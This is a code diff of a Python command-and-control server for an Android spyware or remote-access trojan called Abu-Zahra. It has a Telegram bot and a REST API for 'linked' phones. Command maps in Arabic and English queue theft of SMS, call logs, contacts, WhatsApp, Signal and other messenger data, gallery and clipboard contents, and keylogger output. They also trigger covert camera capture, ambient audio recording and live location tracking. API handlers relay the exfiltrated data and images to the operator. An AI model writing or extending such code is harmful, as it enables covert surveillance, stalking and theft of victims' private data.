+        # ── Execute command from inline button ──
+        if data.startswith("exec_"):
+            parts = data.split("_", 2)
+            if len(parts) >= 3:
+                cmd_name = parts[1]
+                device_id = parts[2]
+                reg = COMMAND_REGISTRY.get(cmd_name)
+                if reg:
+                    await execute_device_command(chat_id, device_id, reg["cmd"], msg_id=message_id)
+                    await answer_callback_query(cb_id, f"Command queued: {reg['desc']}")
+                else:
+                    await answer_callback_query(cb_id, "Unknown command", show_alert=True)
+                return
+
+        # ── Direct cmd_ buttons (from device menu) ──
+        if data.startswith("cmd_"):
+            parts = data.split("_", 1)
+            if len(parts) >= 2:
+                rest = parts[1]
+                # Find device_id (last part after last _)
+                # Handle commands like cmd_battery_deviceid
+                for cmd_key, reg in COMMAND_REGISTRY.items():
+                    prefix = f"cmd_{cmd_key}_"
+                    if rest.startswith(cmd_key + "_"):
+                        device_id = rest[len(cmd_key)+1:]
+                        await execute_device_command(chat_id, device_id, reg["cmd"], msg_id=message_id)
+                        await answer_callback_query(cb_id)
+                        return
+
+        # ── Server actions ──
+        if data == "srv_status":
+            await handle_status(chat_id)
+            await answer_callback_query(cb_id)
+            return
+        if data == "srv_stats":
+            devices = get_devices()
+            online = sum(1 for d in devices if d.get("active"))
+            cmds = load_json(COMMANDS_FILE, [])
+            pending = sum(1 for c in cmds if c.get("status") == "pending")
+            text = f"📈 Stats: {len(devices)} devices ({online} online), {pending} pending cmds, {messages_sent} msgs sent"
+            await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
+            await answer_callback_query(cb_id)
+            return
+        if data == "srv_logs":
+            events = load_json(EVENTS_FILE, [])[-15:]
+            text = "📝 <b>Recent Logs</b>\n\n"
+            for e in events:
+                text += f"[{e.get('time','')[:16]}] {e.get('event','')}\n"
+            await edit_message_text(chat_id, message_id, text[:4000], reply_markup=build_server_menu())
+            await answer_callback_query(cb_id)
+            return
+        if data == "srv_settings":
+            s = load_settings()
+            await edit_message_text(chat_id, message_id, f"⚙️ <b>Settings</b>\n<code>{json.dumps(s, ensure_ascii=False)}</code>", reply_markup=build_server_menu())
+            await answer_callback_query(cb_id)
+            return
+        if data == "srv_cleardata":
+            save_json(COMMANDS_FILE, [])
+            save_json(EVENTS_FILE, [])
+            await edit_message_text(chat_id, message_id, "✅ Data cleared", reply_markup=build_server_menu())
+            await answer_callback_query(cb_id, "Data cleared")
+            return
+        if data == "srv_backup":
+            append_event("Backup created")
+            await edit_message_text(chat_id, message_id, "✅ Backup created", reply_markup=build_server_menu())
+            await answer_callback_query(cb_id)
+            return
+
+        # ── Menu category navigation (opens first device submenu) ──
+        if data.startswith("menu_"):
+            cat = data[5:]
+            d = get_first_device()
+            dev_id = d["id"] if d else "none"
+            if not d:
+                await answer_callback_query(cb_id, "No device linked", show_alert=True)
+                return
+            
+            menu_map = {
+                "data": ("📊 Data Collection", build_data_submenu),
+                "social": ("🌐 Social Media", build_social_submenu),
+                "control": ("🎮 Remote Control", build_control_submenu),
+                "apps": ("📦 App Management", build_apps_submenu),
+                "files": ("📂 File Management", build_files_submenu),
+                "security": ("🔒 Security", build_security_submenu),
+                "monitor": ("🔍 Monitoring", build_monitor_submenu),
+                "syssettings": ("⚙️ System Settings", build_syssettings_submenu),
+            }
+            if cat in menu_map:
+                label, builder = menu_map[cat]
+                await edit_message_text(chat_id, message_id, f"{label} - <b>{d.get('name', dev_id)}</b>", reply_markup=builder(dev_id))
+                await answer_callback_query(cb_id)
+                return
+
+        await answer_callback_query(cb_id)
+    except Exception as exc:
+        log.error("Callback error: %s - %s", exc, traceback.format_exc())
+        await answer_callback_query(cb_id, "Error", show_alert=True)
+
+# ============================================================================
+# REST API ENDPOINTS
+# ============================================================================
+
+async def api_verify_link(request):
+    """POST /api/verify_link - Verify link code, return device_token."""
+    global api_hits
+    api_hits += 1
+    try:
+        body = await request.json()
+        code = body.get("code", "").upper().strip()
+        if not code:
+            return web.json_response({"ok": False, "error": "Code required"}, status=400)
+        
+        result = verify_link_code(code)
+        if not result["ok"]:
+            return web.json_response(result, status=400)
+        
+        # Generate device_token
+        device_token = secrets.token_urlsafe(32)
+        return web.json_response({
+            "ok": True,
+            "device_token": device_token,
+            "server_domain": SERVER_DOMAIN,
+            "message": "Code verified. Use token for registration.",
+        })
+    except Exception as exc:
+        log.error("verify_link error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def api_register(request):
+    """POST /api/register - Register device with server."""
+    global api_hits
+    api_hits += 1
+    try:
+        body = await request.json()
+        device_id = body.get("device_id", "")
+        link_code = body.get("link_code", "").upper().strip()
+        device_token = body.get("device_token", "")
+        device_info = body.get("device_info", {})
+        
+        if not device_id or not link_code:
+            return web.json_response({"ok": False, "error": "device_id and link_code required"}, status=400)
+        
+        # Verify code again
+        result = verify_link_code(link_code)
+        if not result["ok"]:
+            return web.json_response(result, status=400)
+        
+        # Register device
+        device_data = {
+            "id": device_id,
+            "token": device_token or secrets.token_urlsafe(32),
+            "active": True,
+            "name": device_info.get("name", device_id),
+            "model": device_info.get("model", ""),
+            "os": device_info.get("os", ""),
+            "battery": device_info.get("battery", ""),
+            "network": device_info.get("network", ""),
+            "location": device_info.get("location", ""),
+        }
+        add_device(device_data)
+        consume_link_code(link_code, device_id)
+        
+        # Notify admin
+        await send_admin(
+            f"📱 <b>New Device Linked!</b>\n\n"
+            f"📱 Name: <code>{device_data['name']}</code>\n"
+            f"🆔 ID: <code>{device_id}</code>\n"
+            f"📱 Model: <code>{device_data['model']}</code>\n"
+            f"🤖 OS: <code>{device_data['os']}</code>",
+            reply_markup=build_main_menu()
+        )
+        
+        return web.json_response({
+            "ok": True,
+            "device_id": device_id,
+            "token": device_data["token"],
+            "message": "Device registered successfully",
+        })
+    except Exception as exc:
+        log.error("register error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def api_get_commands(request):
+    """GET /api/commands/{device_id} - Get pending commands."""
+    global api_hits
+    api_hits += 1
+    device_id = request.match_info.get("device_id", "")
+    token = request.headers.get("X-Device-Token", "")
+    
+    if not device_id:
+        return web.json_response({"ok": False, "error": "device_id required"}, status=400)
+    
+    # Verify device
+    d = find_device(device_id)
+    if not d:
+        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+    
+    pending = get_pending_commands(device_id)
+    
+    # Mark as sent
+    commands = load_json(COMMANDS_FILE, [])
+    for c in commands:
+        if c.get("device_id") == device_id and c.get("status") == "pending":
+            c["status"] = "sent"
+            c["sent_at"] = ts()
+    save_json(COMMANDS_FILE, commands)
+    
+    # Update last seen
+    update_device(device_id, {"active": True})
+    
+    return web.json_response({
+        "ok": True,
+        "commands": pending,
+        "count": len(pending),
+        "server_time": ts(),
+    })
+
+
+async def api_command_result(request):
+    """POST /api/command_result/{command_id} - Submit command result."""
+    global api_hits
+    api_hits += 1
+    cmd_id = request.match_info.get("command_id", "")
+    try:
+        body = await request.json()
+        status = body.get("status", "completed")
+        result = body.get("result")
+        
+        updated = update_command_status(cmd_id, status, result)
+        if not updated:
+            return web.json_response({"ok": False, "error": "Command not found"}, status=404)
+        
+        # Forward result to admin
+        cmd_name = updated.get("command", "")
+        device_id = updated.get("device_id", "")
         d = find_device(device_id)
-        if d:
-            status = "🟢 متصل" if d.get("active") else "🔴 غير متصل"
-            text = f"📱 <b>{d.get('name', device_id)}</b>\nالحالة: {status}\n\nاختر الإجراء:"
-            await edit_message_text(chat_id, message_id, text, reply_markup=build_device_menu(device_id))
-    elif data.startswith("unlink_"):
-        device_id = data[7:]
-        if remove_device(device_id):
-            text = f"✅ تم فصل الجهاز <code>{device_id}</code>"
-            await edit_message_text(chat_id, message_id, text, reply_markup=build_devices_menu())
-    elif data == "cmd_link":
-        await cmd_link(chat_id)
-
-    # ── Device Commands via Callback ──
-    elif data.startswith("cmd_"):
-        parts = data.split("_", 2)
-        cmd_name = parts[1]
-        device_id = parts[2] if len(parts) > 2 else ""
-
-        command_map = {
-            "sms": ("get_sms", "📲 جلب الرسائل SMS"),
-            "calls": ("get_calls", "📞 جلب سجل المكالمات"),
-            "contacts": ("get_contacts", "📇 جلب جهات الاتصال"),
-            "location": ("get_location", "📍 جلب الموقع"),
-            "notifications": ("get_notifications", "🔔 جلب الإشعارات"),
-            "apps": ("get_apps", "📱 جلب التطبيقات"),
-            "info": ("get_info", "ℹ️ جلب معلومات الجهاز"),
-            "battery": ("get_battery", "🔋 جلب حالة البطارية"),
-            "gallery": ("get_gallery", "🖼️ جلب المعرض"),
-            "clipboard": ("get_clipboard", "📋 جلب الحافظة"),
-            "all": ("get_all", "📥 جلب جميع البيانات"),
-            "whatsapp": ("get_whatsapp", "💬 جلب بيانات واتساب"),
-            "telegram": ("get_telegram", "✈️ جلب بيانات تليجرام"),
-            "instagram": ("get_instagram", "📷 جلب بيانات انستجرام"),
-            "messenger": ("get_messenger", "🔵 جلب بيانات ماسنجر"),
-            "snapchat": ("get_snapchat", "👻 جلب بيانات سناب شات"),
-            "tiktok": ("get_tiktok", "🎵 جلب بيانات تيك توك"),
-            "twitter": ("get_twitter", "🐦 جلب بيانات تويتر"),
-            "viber": ("get_viber", "💜 جلب بيانات فايبر"),
-            "signal": ("get_signal", "🔵 جلب بيانات سيجنال"),
-            "ping": ("ping", "📡 فحص اتصال الجهاز"),
-            "vibrate": ("vibrate", "📳 اهتزاز الجهاز"),
-            "ring": ("ring", "🔔 رنين الجهاز"),
-            "screenshot": ("screenshot", "📸 لقطة شاشة"),
-            "front": ("front_camera", "📷 كاميرا أمامية"),
-            "back": ("back_camera", "📷 كاميرا خلفية"),
-            "record": ("record_audio", "🎙️ تسجيل صوت محيط"),
-            "flash": ("flash_on", "🔦 تشغيل الفلاش"),
-            "flashoff": ("flash_off", "🔦 إطفاء الفلاش"),
-            "location": ("get_location", "📍 جلب الموقع"),
-            "locationlive": ("location_live", "🗺️ بدء التتبع المباشر"),
-            "locationstop": ("location_stop", "⏹️ إيقاف التتبع"),
-            "locationhistory": ("location_history", "📜 سجل المواقع"),
-            "app": ("get_apps", "📱 جلب التطبيقات"),
-            "appusage": ("app_usage", "📊 استخدام التطبيقات"),
-            "screentime": ("screen_time", "⏱️ وقت الشاشة"),
-            "keylogger": ("keylogger_get", "⏩ جلب بيانات المفاتيح"),
-            "keyloggerget": ("keylogger_get", "📥 جلب بيانات المفاتيح"),
-            "simdetect": ("sim_detect_status", "📡 حالة كشف الشريحة"),
-            "wifimonitor": ("wifi_monitor_status", "📶 حالة مراقبة الواي فاي"),
-        }
-
-        # Handle flash_off specially due to underscore
-        if data.startswith("cmd_flash_off"):
-            cmd_key, display = "flash_off", "🔦 إطفاء الفلاش"
-            device_id = data[len("cmd_flash_off_"):]
-            await send_device_command(chat_id, device_id, cmd_key, display)
-            await answer_callback_query(query_id)
-            return
-
-        # Handle front_camera / back_camera
-        if data.startswith("cmd_front_camera"):
-            device_id = data[len("cmd_front_camera_"):]
-            await send_device_command(chat_id, device_id, "front_camera", "📷 كاميرا أمامية")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_back_camera"):
-            device_id = data[len("cmd_back_camera_"):]
-            await send_device_command(chat_id, device_id, "back_camera", "📷 كاميرا خلفية")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_record_audio"):
-            device_id = data[len("cmd_record_audio_"):]
-            await send_device_command(chat_id, device_id, "record_audio", "🎙️ تسجيل صوت محيط")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_location_live"):
-            device_id = data[len("cmd_location_live_"):]
-            await send_device_command(chat_id, device_id, "location_live", "🗺️ بدء التتبع المباشر")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_location_stop"):
-            device_id = data[len("cmd_location_stop_"):]
-            await send_device_command(chat_id, device_id, "location_stop", "⏹️ إيقاف التتبع")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_location_history"):
-            device_id = data[len("cmd_location_history_"):]
-            await send_device_command(chat_id, device_id, "location_history", "📜 سجل المواقع")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_app_usage"):
-            device_id = data[len("cmd_app_usage_"):]
-            await send_device_command(chat_id, device_id, "app_usage", "📊 استخدام التطبيقات")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_screen_time"):
-            device_id = data[len("cmd_screen_time_"):]
-            await send_device_command(chat_id, device_id, "screen_time", "⏱️ وقت الشاشة")
-            await answer_callback_query(query_id)
-            return
-        if data.startswith("cmd_keylogger_get"):
-            device_id = data[len("cmd_keylogger_get_"):]
-            await send_device_command(chat_id, device_id, "keylogger_get", "📥 جلب بيانات المفاتيح")
-            await answer_callback_query(query_id)
-            return
-
-        if cmd_name in command_map:
-            cmd_key, display = command_map[cmd_name]
-            await send_device_command(chat_id, device_id, cmd_key, display)
-        else:
-            text = f"⚠️ الأمر <code>{cmd_name}</code> للجهاز <code>{device_id}</code>"
-            await send_message(chat_id, text, reply_markup=build_back_menu())
-
-    # ── Sub-menus via callback ──
-    elif data.startswith("social_"):
-        device_id = data[7:]
-        text = "🌐 <b>الشبكات الاجتماعية</b>"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_social_menu(device_id))
-    elif data.startswith("control_"):
-        device_id = data[8:]
-        text = "🎮 <b>التحكم عن بعد</b>"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_control_menu(device_id))
-    elif data.startswith("camera_"):
-        device_id = data[7:]
-        text = "📷 <b>الكاميرا</b>"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_camera_menu(device_id))
-
-    # ── Server Commands via Callback ──
-    elif data == "cmd_server_status":
-        devices = get_devices()
-        online = sum(1 for d in devices if d.get("active"))
-        text = (
-            f"📊 <b>حالة الخادم</b>\n\n"
-            f"🟢 يعمل\n"
-            f"⏱️ التشغيل: {format_uptime(uptime())}\n"
-            f"📡 المنفذ: {SERVER_PORT}\n"
-            f"📱 الأجهزة: {len(devices)} ({online} متصل)"
+        dev_name = d.get("name", device_id) if d else device_id
+        
+        result_text = str(result)[:3000] if result else "No data"
+        await send_admin(
+            f"✅ <b>Command Result</b>\n\n"
+            f"📱 Device: <code>{dev_name}</code>\n"
+            f"📋 Command: <code>{cmd_name}</code>\n"
+            f"🆔 ID: <code>{cmd_id}</code>\n"
+            f"📊 Status: <code>{status}</code>\n\n"
+            f"📦 Result:\n<code>{result_text}</code>",
+            disable_notification=True
         )
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
-    elif data == "cmd_server_restart":
-        append_event("طلب إعادة تشغيل", {"source": "telegram_callback"})
-        await edit_message_text(chat_id, message_id, "🔄 جارٍ إعادة تشغيل الخادم...")
-        os._exit(0)
-    elif data == "cmd_backup":
-        devices = get_devices()
-        events = load_json(EVENTS_FILE, [])
-        settings = load_settings()
-        backup = {
-            "timestamp": ts(),
-            "devices": devices,
-            "events": events[-100:],
-            "settings": settings,
-        }
-        backup_file = DATA_DIR / f"backup_{int(time.time())}.json"
-        save_json(backup_file, backup)
-        text = f"💾 تم إنشاء نسخة احتياطية\n📁 <code>{backup_file.name}</code>"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
-    elif data == "cmd_stats":
-        devices = get_devices()
-        online = sum(1 for d in devices if d.get("active"))
-        text = (
-            f"📈 <b>الإحصائيات</b>\n\n"
-            f"⏱️ التشغيل: {format_uptime(uptime())}\n"
-            f"📱 الأجهزة: {len(devices)} ({online} متصل)\n"
-            f"📨 الرسائل: {messages_sent}"
-        )
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_server_menu())
-    elif data == "cmd_geo_fence":
-        settings = load_settings()
-        fences = settings.get("geofences", [])
-        text = "🎮 <b>المناطق الجغرافية</b>\n\n"
-        if fences:
-            for i, f in enumerate(fences):
-                text += f"{i+1}. {f.get('name', '—')} - {f.get('radius', 0)}م\n"
+        
+        return web.json_response({"ok": True, "message": "Result received"})
+    except Exception as exc:
+        log.error("command_result error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+async def api_device_data(request):
+    """POST /api/data/{device_id} - Receive data from device."""
+    global api_hits
+    api_hits += 1
+    device_id = request.match_info.get("device_id", "")
+    try:
+        body = await request.json()
+        data_type = body.get("type", "")
+        data = body.get("data", {})
+        
+        d = find_device(device_id)
+        if not d:
+            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+        
+        dev_name = d.get("name", device_id)
+        update_device(device_id, {"active": True})
+        
+        # Handle different data types
+        if data_type == "location":
+            lat = data.get("lat", "")
+            lon = data.get("lon", "")
+            update_device(device_id, {"location": f"{lat},{lon}"})
+            await send_admin(
+                f"📍 <b>Location Update</b>\n"
+                f"📱 {dev_name}\n"
+                f"🗺️ <a href='https://maps.google.com/?q={lat},{lon}'>View Map</a>",
+                disable_notification=True
+            )
+        elif data_type == "battery":
+            level = data.get("level", "?")
+            update_device(device_id, {"battery": level})
+        elif data_type == "screenshot" or data_type == "camera":
+            img_data = data.get("image", "")
+            if img_data and len(img_data) > 100:
+                import base64
+                try:
+                    await send_photo(ADMIN_CHAT_ID, base64.b64decode(img_data),
+                                     caption=f"📷 {data_type} from {dev_name}")
+                except:
+                    await send_admin(f"📷 {data_type} from {dev_name}\n(Image data received)", disable_notification=True)
         else:
-            text += "لا توجد مناطق محددة"
-        await edit_message_text(chat_id, message_id, text, reply_markup=build_location_menu())
-    elif data == "no_action":
-        await answer_callback_query(query_id, "لا يوجد إجراء متاح")
-    else:
-        await answer_callback_query(query_id, f"غير معروف: {data}")
-
-    await answer_callback_query(query_id)
-
-
-# ═══════════════════════════════════════════════════════════════════════════════
-# getUpdates Polling Loop
-# ═══════════════════════════════════════════════════════════════════════════════
-
-async def poll_updates():
-    global tg_offset, polling_active
-    polling_active = True
-    log.info("Starting getUpdates polling...")
-    append_event("بدء استطلاع التحديثات", {})
-
-    while polling_active:
-        try:
-            result = await tg_request("getUpdates", {
-                "offset": tg_offset,
-                "timeout": 30,
-                "allowed_updates": ["message", "callback_query"],
-            })
-            if not result or not result.get("ok"):
-                await asyncio.sleep(2)
-                continue
-
-            updates = result.get("result", [])
-            for update in updates:
-                tg_offset = update.get("update_id", 0) + 1
-
-                # Handle message
-                if "message" in update:
-                    message = update["message"]
-                    chat_id = message.get("chat", {}).get("id")
-                    user_id = message.get("from", {}).get("id")
-                    text = message.get("text", "")
-
-                    if chat_id != ADMIN_CHAT_ID:
-                        log.warning("Unauthorized access from chat_id=%s user_id=%s", chat_id, user_id)
-                        continue
-
-                    if text.startswith("/"):
-                        await handle_command(chat_id, text)
-                    elif message.get("new_chat_members"):
-                        for member in message["new_chat_members"]:
-                            if member.get("id") == (await tg_request("getMe", {})).get("result", {}).get("id"):
-                                await send_message(chat_id, "🟢 تم تفعيل البوت بنجاح! استخدم /start للبدء.")
-
-                # Handle callback query
-                elif "callback_query" in update:
-                    cb = update["callback_query"]
-                    cb_chat_id = cb.get("message", {}).get("chat", {}).get("id")
-                    cb_user_id = cb.get("from", {}).get("id")
-                    if cb_chat_id != ADMIN_CHAT_ID or cb_user_id != ADMIN_CHAT_ID:
-                        continue
-                    await handle_callback_query(cb)
-
-        except asyncio.CancelledError:
-            break
-        except Exception as exc:
-            log.error("Polling error: %s", exc)
-            append_event("خطأ في الاستطلاع", {"error": str(exc)}, "error")
-            await asyncio.sleep(5)
+            # Generic data forward
+            data_str = json.dumps(data, ensure_ascii=False)[:3000] if data else "Empty"
+            await send_admin(
+                f"📦 <b>Data Received</b>\n"
+                f"📱 {dev_name}\n"
+                f"📋 Type: <code>{data_type}</code>\n\n"
+                f"<code>{data_str}</code>",
+                disable_notification=True
+            )
+        
+        append_event(f"Data received: {data_type}", {"device_id": device_id})
+        
+        return web.json_response({"ok": True, "message": "Data received"})
+    except Exception as exc:
+        log.error("device_data error: %s", exc)
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
 
 
-# ═══════════════════════════════════════════════════════════════════════════════
-# Web Dashboard HTML
-# ═══════════════════════════════════════════════════════════════════════════════
+async def api_device_settings(request):
+    """GET /api/settings/{device_id} - Get device settings."""
+    global api_hits
+    api_hits += 1
+    device_id = request.match_info.get("device_id", "")
+    d = find_device(device_id)
+    if not d:
+        return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+    
+    settings = load_settings()
+    return web.json_response({
+        "ok": True,
+        "settings": {
+            "sync_interval": settings.get("sync_interval", 300),
+            "location_interval": settings.get("location_interval", 60),
+            "auto_location": settings.get("auto_location", True),
+            "auto_sync": settings.get("auto_sync", True),
+            "keylogger": settings.get("keylogger", False),
+            "notifications": settings.get("notifications", True),
+        }
+    })
+
+
+async def api_web_login(request):
+    """POST /api/login - Web dashboard login."""
+    global api_hits
+    api_hits += 1
+    try:
+        body = await request.json()
+        username = body.get("username", "admin")
+        password = body.get("password", "")
+        ip = request.remote or ""
+        ua = request.headers.get("User-Agent", "")
+        
+        session = create_session(username, password, ip, ua)
+        if not session:
+            return web.json_response({"ok": False, "error": "Invalid credentials"}, status=401)
+        
+        return web.json_response({
+            "ok": True,
+            "token": session["token"],
+            "expires_at": session["expires_at"],
+        })
+    except Exception as exc:
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+def require_auth(func):
+    """Decorator to require valid session token."""
+    async def wrapper(request, *args, **kwargs):
+        global api_hits
+        api_hits += 1
+        auth = request.headers.get("Authorization", "")
+        token = auth.replace("Bearer ", "") if auth.startswith("Bearer ") else ""
+        if not token:
+            return web.json_response({"ok": False, "error": "Unauthorized"}, status=401)
+        session = validate_session(token)
+        if not session:
+            return web.json_response({"ok": False, "error": "Session expired"}, status=401)
+        request["session"] = session
+        return await func(request, *args, **kwargs)
+    return wrapper
+
+
+@require_auth
+async def api_web_devices(request):
+    devices = get_devices()
+    return web.json_response({"ok": True, "devices": devices})
+
+
+@require_auth
+async def api_web_device_detail(request):
+    device_id = request.match_info.get("device_id", "")
+    d = find_device(device_id)
+    if not d:
+        return web.json_response({"ok": False, "error": "Not found"}, status=404)
+    cmds = load_json(COMMANDS_FILE, [])
+    device_cmds = [c for c in cmds if c.get("device_id") == device_id][-50:]
+    return web.json_response({"ok": True, "device": d, "commands": device_cmds})
+
+
+@require_auth
+async def api_web_commands(request):
+    commands = load_json(COMMANDS_FILE, [])
+    return web.json_response({"ok": True, "commands": commands[-100:]})
+
+
+@require_auth
+async def api_web_events(request):
+    events = load_json(EVENTS_FILE, [])
+    return web.json_response({"ok": True, "events": events[-100:]})
+
+
+@require_auth
+async def api_web_stats(request):
+    devices = get_devices()
+    online = sum(1 for d in devices if d.get("active"))
+    cmds = load_json(COMMANDS_FILE, [])
+    pending = sum(1 for c in cmds if c.get("status") == "pending")
+    completed = sum(1 for c in cmds if c.get("status") == "completed")
+    events = load_json(EVENTS_FILE, [])
+    return web.json_response({
+        "ok": True,
+        "stats": {
+            "uptime": get_uptime(),
+            "uptime_formatted": format_uptime(get_uptime()),
+            "devices_total": len(devices),
+            "devices_online": online,
+            "commands_total": len(cmds),
+            "commands_pending": pending,
+            "commands_completed": completed,
+            "messages_sent": messages_sent,
+            "api_hits": api_hits,
+            "events_total": len(events),
+            "total_registered_commands": len(COMMAND_REGISTRY),
+            "server_time": ts(),
+            "port": SERVER_PORT,
+            "domain": SERVER_DOMAIN,
+        }
+    })
+
+
+@require_auth
+async def api_web_send_command(request):
+    try:
+        body = await request.json()
+        device_id = body.get("device_id", "")
+        command = body.get("command", "")
+        params = body.get("params", {})
+        
+        if not device_id or not command:
+            return web.json_response({"ok": False, "error": "device_id and command required"}, status=400)
+        
+        d = find_device(device_id)
+        if not d:
+            return web.json_response({"ok": False, "error": "Device not found"}, status=404)
+        
+        cmd = queue_command(device_id, command, params)
+        return web.json_response({"ok": True, "command": cmd})
+    except Exception as exc:
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+@require_auth
+async def api_web_link_code(request):
+    entry = generate_link_code()
+    return web.json_response({"ok": True, "code": entry["code"], "expires_at": entry["expires_at"]})
+
+
+@require_auth
+async def api_web_settings_get(request):
+    settings = load_settings()
+    return web.json_response({"ok": True, "settings": settings})
+
+
+@require_auth
+async def api_web_settings_set(request):
+    try:
+        body = await request.json()
+        settings = load_settings()
+        for key, value in body.items():
+            if key in settings:
+                settings[key] = value
+        save_settings_data(settings)
+        return web.json_response({"ok": True})
+    except Exception as exc:
+        return web.json_response({"ok": False, "error": str(exc)}, status=500)
+
+
+@require_auth
+async def api_web_unlink(request):
+    device_id = request.match_info.get("device_id", "")
+    if remove_device(device_id):
+        return web.json_response({"ok": True})
+    return web.json_response({"ok": False, "error": "Not found"}, status=404)
+
+# ============================================================================
+# WEB DASHBOARD HTML
+# ============================================================================
 
 DASHBOARD_HTML = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>أبو زهرة - لوحة التحكم</title>
+<title>Abu-Zahra Dashboard</title>
 <style>
-:root{--bg:#0a0a1a;--surface:#12122a;--surface2:#1a1a3e;--border:#2a2a4a;--accent:#e94560;--accent2:#ff6b81;--text:#e0e0e0;--text2:#888;--success:#00c853;--warning:#ffc107;--danger:#ff1744;--info:#64b5f6}
+:root{--bg:#0a0a0f;--surface:#12121a;--surface2:#1a1a2e;--border:#2a2a3e;--text:#e0e0e0;--text2:#888;--accent:#e63946;--accent2:#ff6b6b;--green:#4ade80;--blue:#60a5fa;--yellow:#fbbf24;--purple:#a78bfa;--radius:12px}
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,Arial,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;direction:rtl}
-a{color:var(--accent);text-decoration:none}
-
-/* Login */
-.login-wrap{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
-.login-box{background:var(--surface);border:1px solid var(--border);border-radius:16px;padding:40px;width:100%;max-width:400px;text-align:center}
-.login-box h1{color:var(--accent);font-size:1.8rem;margin-bottom:8px}
-.login-box p{color:var(--text2);margin-bottom:24px;font-size:.9rem}
-.login-box input{width:100%;padding:12px 16px;background:var(--surface2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:1rem;margin-bottom:12px;text-align:right;outline:none;transition:border .2s}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:var(--bg);color:var(--text);min-height:100vh}
+.login-page{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#0a0a0f,#1a1a2e)}
+.login-box{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:40px;width:360px;max-width:90vw;text-align:center}
+.login-box h1{color:var(--accent);margin-bottom:8px;font-size:24px}
+.login-box p{color:var(--text2);margin-bottom:24px;font-size:14px}
+.login-box input{width:100%;padding:12px 16px;border-radius:8px;border:1px solid var(--border);background:var(--bg);color:var(--text);font-size:15px;margin-bottom:12px;outline:none;transition:border .2s}
 .login-box input:focus{border-color:var(--accent)}
-.login-box button{width:100%;padding:12px;background:var(--accent);color:#fff;border:none;border-radius:8px;font-size:1rem;cursor:pointer;transition:background .2s}
+.login-box button{width:100%;padding:12px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-size:16px;cursor:pointer;transition:background .2s;font-weight:bold}
 .login-box button:hover{background:var(--accent2)}
-.login-error{color:var(--danger);font-size:.85rem;margin-top:12px;display:none}
-
-/* Sidebar */
-.sidebar{position:fixed;right:0;top:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);z-index:100;transition:transform .3s;overflow-y:auto}
-.sidebar.collapsed{transform:translateX(100%)}
-.sidebar-header{padding:20px;text-align:center;border-bottom:1px solid var(--border)}
-.sidebar-header h2{color:var(--accent);font-size:1.2rem}
-.sidebar-header .dot{width:10px;height:10px;border-radius:50%;background:var(--success);display:inline-block;margin-left:6px;box-shadow:0 0 8px var(--success)}
-.nav-item{display:flex;align-items:center;gap:10px;padding:12px 20px;cursor:pointer;transition:all .2s;color:var(--text2);font-size:.9rem;border-right:3px solid transparent}
-.nav-item:hover,.nav-item.active{background:var(--surface2);color:var(--accent);border-right-color:var(--accent)}
-.nav-item .icon{font-size:1.1rem;width:24px;text-align:center}
-
-/* Main */
-.main{margin-right:240px;padding:0;transition:margin .3s}
-.main.expanded{margin-right:0}
-.topbar{background:var(--surface);border-bottom:1px solid var(--border);padding:16px 24px;display:flex;justify-content:space-between;align-items:center;position:sticky;top:0;z-index:50}
-.topbar h1{font-size:1.1rem;color:var(--text)}
-.topbar-actions{display:flex;gap:12px;align-items:center}
-.hamburger{display:none;background:none;border:none;color:var(--text);font-size:1.5rem;cursor:pointer}
-.content{padding:24px}
-
-/* Cards */
+.login-error{color:var(--accent);font-size:13px;margin-top:8px;display:none}
+.app{display:none;min-height:100vh}
+.sidebar{position:fixed;top:0;right:0;width:240px;height:100vh;background:var(--surface);border-left:1px solid var(--border);padding:20px 0;z-index:100;transition:transform .3s}
+.sidebar .logo{padding:0 20px 20px;border-bottom:1px solid var(--border);margin-bottom:16px}
+.sidebar .logo h2{color:var(--accent);font-size:18px}
+.sidebar .logo span{color:var(--text2);font-size:11px}
+.sidebar a{display:flex;align-items:center;padding:12px 20px;color:var(--text2);text-decoration:none;transition:all .2s;cursor:pointer;font-size:14px;gap:10px}
+.sidebar a:hover,.sidebar a.active{background:var(--surface2);color:var(--text)}
+.sidebar a.active{border-right:3px solid var(--accent);color:var(--accent)}
+.main{margin-right:240px;padding:24px;min-height:100vh}
+.page{display:none}
+.page.active{display:block}
+.topbar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
+.topbar h1{font-size:22px;font-weight:600}
+.topbar .time{color:var(--text2);font-size:13px}
